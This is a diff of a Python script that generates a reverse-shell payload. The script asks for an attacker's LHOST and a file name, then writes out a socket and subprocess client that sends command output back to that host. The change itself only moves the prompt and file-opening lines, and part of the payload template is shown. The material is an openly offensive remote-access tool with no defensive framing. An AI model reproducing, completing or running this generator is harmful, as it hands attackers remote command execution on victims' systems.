@@ -66,6 +66,13 @@ def finish():
     print ("100%")
     time.sleep(3)
     
+
+    
+banner()
+ip = input("[!] Select Your LHOST")
+file_name = input("[!] Insert a file name.py: ")
+arq = open(file_name, 'w')
+finish()
 temp = """
 import socket
 import subprocess
@@ -106,12 +113,6 @@ while True:
     print("[-] Sending response...")
     client.send(output + output_error)
     """
-    
-banner()
-file_name = input("[!] Insert a file name.py: ")
-ip = input("[!] Select Your LHOST")
-arq = open(file_name, 'w')
-finish()
 arq.write(temp + "\n")
 os.system("clear")
 print ("[*] Finish!!!")
